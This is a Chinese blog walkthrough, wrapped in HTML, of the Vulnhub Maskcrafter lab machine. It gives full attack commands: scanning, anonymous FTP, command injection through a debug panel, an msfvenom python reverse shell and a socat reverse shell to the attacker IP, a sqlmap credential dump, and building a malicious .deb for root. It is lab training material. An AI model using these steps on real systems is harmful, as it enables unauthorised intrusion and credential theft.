@@ -1,0 +1,1739 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Vulnhub—Maskcrafter, a4ua">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Vulnhub—Maskcrafter | a4ua</title>
+    <link rel="icon" type="image/jpeg" href="/medias/tx.jpg">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 4.1.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/tx.jpg" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">a4ua</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-user-secret" style="zoom: 0.6;"></i>
+      
+      <span>Cyber Security</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/categories/Web%E5%AE%89%E5%85%A8/">
+          
+          <i class="fas fa-bug" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Web安全</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+          
+          <i class="fas fa-code" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>代码审计</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+          
+          <i class="fas fa-desktop" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>内网渗透</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-shield-alt" style="zoom: 0.6;"></i>
+      
+      <span>Blue Team</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">
+          
+          <i class="fas fa-user-nurse" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>应急响应</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/">
+          
+          <i class="fas fa-fingerprint" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>日志分析</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">
+          
+          <i class="fas fa-file-contract" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>流量分析</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-laptop-code" style="zoom: 0.6;"></i>
+      
+      <span>编程</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/categories/Golang/">
+          
+          <i class="fab fa-google" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Golang</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/Python/">
+          
+          <i class="fab fa-python" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Python</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/PHP/">
+          
+          <i class="fab fa-php" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>PHP</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fab fa-linux" style="zoom: 0.6;"></i>
+      
+      <span>操作系统</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/categories/linux/">
+          
+          <i class="fab fa-linux" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Linux</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/windows/">
+          
+          <i class="fab fa-windows" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Windows</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" class="waves-effect waves-light">
+      
+      <i class="fas fa-leaf" style="zoom: 0.6;"></i>
+      
+      <span>机器学习</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-seedling" style="zoom: 0.6;"></i>
+      
+      <span>瞎折腾系列</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/categories/%E6%A1%8C%E9%9D%A2%E7%BE%8E%E5%8C%96/">
+          
+          <i class="fas fa-magic" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>桌面美化</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-bars" style="zoom: 0.6;"></i>
+      
+      <span>其它</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/categories/">
+          
+          <i class="fas fa-bookmark" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>文章分类</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/archives">
+          
+          <i class="fas fa-archive" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>文章归档</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/about">
+          
+          <i class="fas fa-user-circle" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>关于我</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/tx.jpg" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">a4ua</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-user-secret"></i>
+			
+			Cyber Security
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/categories/Web%E5%AE%89%E5%85%A8/ " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-bug" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Web安全</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-code" style="position: absolute;left:50px" ></i>
+			      
+		          <span>代码审计</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-desktop" style="position: absolute;left:50px" ></i>
+			      
+		          <span>内网渗透</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-shield-alt"></i>
+			
+			Blue Team
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/ " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-user-nurse" style="position: absolute;left:50px" ></i>
+			      
+		          <span>应急响应</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/ " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-fingerprint" style="position: absolute;left:50px" ></i>
+			      
+		          <span>日志分析</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/ " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-file-contract" style="position: absolute;left:50px" ></i>
+			      
+		          <span>流量分析</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-laptop-code"></i>
+			
+			编程
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/categories/Golang/ " style="margin-left:75px">
+				  
+				   <i class="fa fab fa-google" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Golang</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories/Python/ " style="margin-left:75px">
+				  
+				   <i class="fa fab fa-python" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Python</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories/PHP/ " style="margin-left:75px">
+				  
+				   <i class="fa fab fa-php" style="position: absolute;left:50px" ></i>
+			      
+		          <span>PHP</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fab fa-linux"></i>
+			
+			操作系统
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/categories/linux/ " style="margin-left:75px">
+				  
+				   <i class="fa fab fa-linux" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Linux</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories/windows/ " style="margin-left:75px">
+				  
+				   <i class="fa fab fa-windows" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Windows</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-leaf"></i>
+			
+			机器学习
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-seedling"></i>
+			
+			瞎折腾系列
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/categories/%E6%A1%8C%E9%9D%A2%E7%BE%8E%E5%8C%96/ " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-magic" style="position: absolute;left:50px" ></i>
+			      
+		          <span>桌面美化</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-bars"></i>
+			
+			其它
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/categories/ " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-bookmark" style="position: absolute;left:50px" ></i>
+			      
+		          <span>文章分类</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/archives " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-archive" style="position: absolute;left:50px" ></i>
+			      
+		          <span>文章归档</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/about " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-user-circle" style="position: absolute;left:50px" ></i>
+			      
+		          <span>关于我</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Vulnhub—Maskcrafter</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tagsio/Vulnhub/">
+                                <span class="chip bg-color">Vulnhub</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CTF/" class="post-category">
+                                CTF
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-10-26
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2020-10-27
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    1.3k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    5 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="一、靶机介绍"><a href="#一、靶机介绍" class="headerlink" title="一、靶机介绍"></a>一、靶机介绍</h2><ul>
+<li><p><strong>Name</strong>: maskcrafter: 1.1</p>
+</li>
+<li><p><strong>Author</strong>: <a href="https://www.vulnhub.com/author/evdaez,679/" target="_blank" rel="noopener">evdaez</a></p>
+</li>
+<li><p><strong>Download (Mirror)</strong>: <a href="https://download.vulnhub.com/maskcrafter/maskcrafter-1.1.ova" target="_blank" rel="noopener">https://download.vulnhub.com/maskcrafter/maskcrafter-1.1.ova</a></p>
+</li>
+<li><p><strong>Level</strong>: Beginners</p>
+<ul>
+<li>Doesn’t require bruteforcing, if you are bruteforcing, you are doing it the wrong way.</li>
+<li>Doesn’t require advance web knowledge to get user.</li>
+<li>Doesn’t require advance knowledge to get root too, but there is an alternative harder way.</li>
+<li>2 ways to get user.</li>
+<li>2 ways to get root.</li>
+</ul>
+</li>
+<li><p><strong>Environment</strong></p>
+<ul>
+<li>DHCP-Client.</li>
+<li>Runs on vmware workstation.</li>
+</ul>
+</li>
+</ul>
+<h2 id="二、主机信息收集"><a href="#二、主机信息收集" class="headerlink" title="二、主机信息收集"></a>二、主机信息收集</h2><h5 id="1-主机探测"><a href="#1-主机探测" class="headerlink" title="1.主机探测"></a>1.主机探测</h5><ul>
+<li><p><code>nmap -sn -PE 192.168.90.0/24</code></p>
+<blockquote>
+<p>靶机采用DHCP自动获取地址，因此进行主机探测。找到靶机地址为<code>192.168.90.2</code>，Kali的IP为<code>192.168.90.3</code>。</p>
+</blockquote>
+</li>
+</ul>
+<img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026100149761.png" alt="image-20201026100149761" style="zoom: 50%;">
+
+<h5 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h5><ul>
+<li><p><code>nmap -Pn -n -sV 192.168.90.2 -p- --min-rate=2000</code></p>
+<blockquote>
+<p>发现开放端口：FTP (21), SSH (22), HTTP (80), RPC (111), NFS (2049).</p>
+</blockquote>
+  <img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026101252102.png" alt="image-20201026101252102" style="zoom:50%;">
+
+</li>
+</ul>
+<h2 id="三、FTP-Anonymous"><a href="#三、FTP-Anonymous" class="headerlink" title="三、FTP Anonymous"></a>三、FTP Anonymous</h2><p>使用<code>Nmap</code>对<code>FTP</code>服务进行漏洞扫描，发现开启了FTP匿名用户登录。</p>
+<ul>
+<li><p><code>nmap 192.168.90.2 --script=ftp* -p21</code></p>
+  <img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026103147095.png" alt="image-20201026103147095" style="zoom:50%;">
+
+</li>
+</ul>
+<p>使用匿名用户登录FTP服务，发现存在<code>pub</code>目录，目录下有两个文件，分别为：<code>NOTES.txt</code>、<code>cred.zip</code>，先将两个文件下载到本地。</p>
+<blockquote>
+<p>ftp</p>
+<p>open 192.168.90.2</p>
+<p>用户名：Anonymous，密码为空。</p>
+<p>get NOTES.txt</p>
+<p>get cred.zip</p>
+</blockquote>
+<img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026103607881.png" alt="image-20201026103607881" style="zoom:50%;">
+
+<p>尝试解压<code>cred.zip</code>发现被加密，需要解压密码，暂时放一边。</p>
+<p>打开<code>NOTES.txt</code>，从中可以获得两个信息：</p>
+<ul>
+<li>存在<code>/debug</code>目录，且用户名为<code>admin</code>.</li>
+<li>存在SQL注入漏洞。</li>
+</ul>
+<img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026104159144.png" alt="image-20201026104159144" style="zoom:50%;">
+
+<h2 id="四、Web信息收集"><a href="#四、Web信息收集" class="headerlink" title="四、Web信息收集"></a>四、Web信息收集</h2><h5 id="1-Web指纹"><a href="#1-Web指纹" class="headerlink" title="1.Web指纹"></a>1.Web指纹</h5><ul>
+<li><p><code>whatweb http://192.168.90.2 -a 3</code></p>
+<blockquote>
+<p>收集到的信息， Ubuntu + Apache + PHP + <a href="mailto:&#97;&#100;&#x6d;&#x69;&#x6e;&#x40;&#99;&#111;&#118;&#x69;&#100;&#x31;&#57;&#46;&#108;&#111;&#x63;&#97;">&#97;&#100;&#x6d;&#x69;&#x6e;&#x40;&#99;&#111;&#118;&#x69;&#100;&#x31;&#57;&#46;&#108;&#111;&#x63;&#97;</a>。</p>
+</blockquote>
+</li>
+</ul>
+<img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026104808711.png" alt="image-20201026104808711" style="zoom:50%;">
+
+<h5 id="2-目录扫描"><a href="#2-目录扫描" class="headerlink" title="2.目录扫描"></a>2.目录扫描</h5><ul>
+<li><p><code>dirb http://192.168.90.2</code></p>
+<blockquote>
+<p><a href="http://192.168.90.2/debug" target="_blank" rel="noopener">http://192.168.90.2/debug</a> (CODE:401|SIZE:459) </p>
+<p><a href="http://192.168.90.2/robots.txt" target="_blank" rel="noopener">http://192.168.90.2/robots.txt</a> (CODE:200|SIZE:31)</p>
+<p><a href="http://192.168.90.2/phpmyadmin/index.php" target="_blank" rel="noopener">http://192.168.90.2/phpmyadmin/index.php</a> (CODE:200|SIZE:10525)</p>
+</blockquote>
+</li>
+</ul>
+<h2 id="五、获取普通用户权限（两种方式）"><a href="#五、获取普通用户权限（两种方式）" class="headerlink" title="五、获取普通用户权限（两种方式）"></a>五、获取普通用户权限（两种方式）</h2><h4 id="第一种方式：弱口令-命令执行"><a href="#第一种方式：弱口令-命令执行" class="headerlink" title="第一种方式：弱口令+命令执行"></a>第一种方式：弱口令+命令执行</h4><p>访问<code>http://192.168.90.2/debug</code>，需要登录，通过前面的信息，我们知道存在<code>admin</code>用户，尝试弱口令密码也用<code>admin</code>，成功登录。</p>
+<p>进入后台后发现存在命令执行的功能，使用<code>BurpSuite</code>抓包修改<code>command</code>参数发现可以执行任意命令。</p>
+<img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026110404944.png" alt="image-20201026110404944" style="zoom:50%;">
+
+<p><strong>获取Shell</strong></p>
+<p>由于是<code>www-data</code>用户，无法使用<code>bash</code>和<code>nc</code>反弹Shell，但可以使用Python反弹Shell。</p>
+<p>先使用<code>msfvenom</code>生成Payload:</p>
+<ul>
+<li><code>msfvenom -p cmd/unix/reverse_python lhost=192.168.90.3 lport=4444 -f raw</code></li>
+</ul>
+<p>然后在Kali中开启监听：</p>
+<ul>
+<li><code>nc -lnvp 4444</code></li>
+</ul>
+<p>使用BurpSuite传入生成的Payload后，成功获取到Shell，使用Python生成交互式的Shell：</p>
+<ul>
+<li><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></li>
+</ul>
+<img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026112522083.png" alt="image-20201026112522083" style="zoom:50%;">
+
+<p><strong>获取数据库数据</strong></p>
+<p>找到数据库连接文件<code>db.php</code>，获取数据库的用户名密码（<code>web/P@ssw0rdweb</code>）</p>
+<img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026112930388.png" alt="image-20201026112930388" style="zoom:50%;">
+
+<p>登录数据库，在浏览<code>mydatabase</code>数据库时，发现存在<code>creds</code>数据表，联系到我们前面被加密的<code>creds.zip</code>，表中里面存放的是解压密码（<code>cred12345!!</code>）。</p>
+<img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026113916751.png" alt="image-20201026113916751" style="zoom:50%;">
+
+<img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026114453575.png" alt="image-20201026114453575" style="zoom: 67%;">
+
+<p>使用解压密码解压得到<code>userx:thisismypasswordforuserx2020</code>，再通过查看<code>/etc/passwd</code>，猜测为用户名密码，通过SSH进行登录，成功获取到普通用户的权限。</p>
+<img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026114942260.png" alt="image-20201026114942260" style="zoom:50%;">
+
+<img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026115101873.png" alt="image-20201026115101873" style="zoom:50%;">
+
+<h4 id="第二种方式：SQLi"><a href="#第二种方式：SQLi" class="headerlink" title="第二种方式：SQLi"></a>第二种方式：SQLi</h4><p>通过<code>NOTES.txt</code>文件给的信息可知系统存在SQL注入漏洞，对<code>/login.php</code>的登录功能进行SQL注入测试。也可以成功获取到解压密码。</p>
+<blockquote>
+<p><code>sqlmap -u &quot;http://192.168.90.2/login.php&quot; --forms --level 3</code></p>
+<p><code>sqlmap -u &quot;http://192.168.90.2/login.php&quot; --forms --level 3 --dbs</code></p>
+<p><code>sqlmap -u &quot;http://192.168.90.2/login.php&quot; --forms --level 3 -D mydatabase --tables --batch</code></p>
+<p><code>sqlmap -u &quot;http://192.168.90.2/login.php&quot; --forms --level 3 -D mydatabase -T creds --columns --batch</code></p>
+<p><code>sqlmap -u &quot;http://192.168.90.2/login.php&quot; --forms --level 3 -D mydatabase -T creds -C id,password --dump --batch</code></p>
+</blockquote>
+<h2 id="六、权限提升"><a href="#六、权限提升" class="headerlink" title="六、权限提升"></a>六、权限提升</h2><p>使用<code>userx</code>登录后，输入<code>sudo -l</code>查看可以使用<code>sudo</code>执行的命令，发现<code>userx</code>用户可以使用<code>evdaez</code>用户权限执行<code>/scripts/whatsmyid.sh</code>脚本且不需要密码。</p>
+<img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026153933779.png" alt="image-20201026153933779" style="zoom:50%;">
+
+<p><strong>获取<code>evdaez</code>用户权限</strong></p>
+<p>修改<code>/scripts/whatsmyid.sh</code>内容为<code>/bin/bash</code>,并使用<code>evdaez</code>用户身份执行该脚本，可以获取到<code>evdaez</code>用户权限的Shell。</p>
+<ul>
+<li><code>sudo -u evdaez /scripts/whatsmyid.sh</code></li>
+</ul>
+<img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026154541469.png" alt="image-20201026154541469" style="zoom:50%;">
+
+<p>继续执行<code>sudo -l</code>，发现<code>evdaez</code>用户可以使用<code>researcherx</code>用户的权限执行<code>socat</code>命令。</p>
+<img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026154812666.png" alt="image-20201026154812666" style="zoom:50%;">
+
+<p><strong>获取<code>researcherx</code>用户权限</strong></p>
+<p>使用<code>researcherx</code>用户权限执行<code>socat</code>命令，反弹交互式的Shell。在此之前，需要在Kali中开启监听：</p>
+<ul>
+<li>socat file:`tty`,raw,echo=0 tcp-listen:5555</li>
+</ul>
+<p>然后在靶机中执行命令反弹Shell：</p>
+<ul>
+<li><code>sudo -u researcherx socat tcp4-connect:192.168.90.3:5555 exec:/bin/sh,pty,stderr,setsid,sigint,sane</code></li>
+</ul>
+<p>成功获取到<code>researcherx</code>用户权限的Shell，继续执行<code>sudo -l</code>,发现可以使用任意用户权限执行<code>dpkg</code>命令。</p>
+<img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026162024637.png" alt="image-20201026162024637" style="zoom:50%;">
+
+<p><strong>获取<code>root</code>权限</strong></p>
+<p>首先在Kali主机中创建一个可以返回Shell的<code>.sh</code>脚本文件，然后使用<code>fpm</code>生成<code>.deb</code>包，生成的包名为<code>mydeb_1.0_all.deb</code>，然后再用python监听一个HTTP服务器，使得靶机可以下载该<code>deb</code>包。</p>
+<blockquote>
+<p><code>mkdir tmpdir</code></p>
+<p><code>echo &#39;exec /bin/sh&#39; &gt; ./tmpdir/payload.sh</code></p>
+<p><code>sudo gem install fpm &amp;&amp; fpm -n mydeb -s dir -t deb -a all --before-install tmpdir/payload.sh tmpdir</code></p>
+<p><code>python -m SimpleHTTPServer</code></p>
+</blockquote>
